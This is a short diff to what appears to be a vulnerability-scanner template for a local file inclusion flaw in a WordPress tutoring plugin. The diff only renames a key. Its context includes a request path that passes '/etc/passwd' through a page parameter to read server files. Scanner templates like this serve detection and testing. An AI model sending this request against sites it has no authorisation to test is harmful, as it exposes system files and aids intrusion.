@@ -7,7 +7,7 @@ info:
   reference: https://www.exploit-db.com/exploits/48058
   tags: wordpress,wp-plugin,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd"
